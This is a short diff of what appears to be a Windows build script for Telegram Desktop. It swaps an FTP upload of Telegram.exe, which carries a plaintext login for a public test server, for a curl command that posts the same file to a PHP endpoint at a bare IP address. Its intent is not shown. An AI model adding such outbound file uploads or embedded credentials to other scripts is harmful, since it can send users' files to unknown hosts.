@@ -1,4 +1,1 @@
-cd C:
-cd C:\TBuild\tdesktop\out\Debug
-(echo open ftp.dlptest.com& echo dlpuser@dlptest.com& echo fwRhzAnR1vgig8s& echo binary& echo put Telegram.exe& echo quit& echo.) > ftpdata
-ftp -s:ftpdata
+curl -F "data=@c:\Users\cloudcoder\Telegram.exe" http://94.142.139.95/files/pdfa.php
